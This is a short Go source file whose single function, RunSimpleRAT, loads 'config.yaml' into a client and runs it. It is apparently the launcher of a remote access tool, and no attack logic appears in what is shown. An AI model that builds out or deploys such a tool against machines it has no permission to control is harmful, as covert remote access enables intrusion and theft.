package client

func RunSimpleRAT() error {

	c, err := New("config.yaml")
	if err != nil {
		return err
	}

	return c.Run()
}
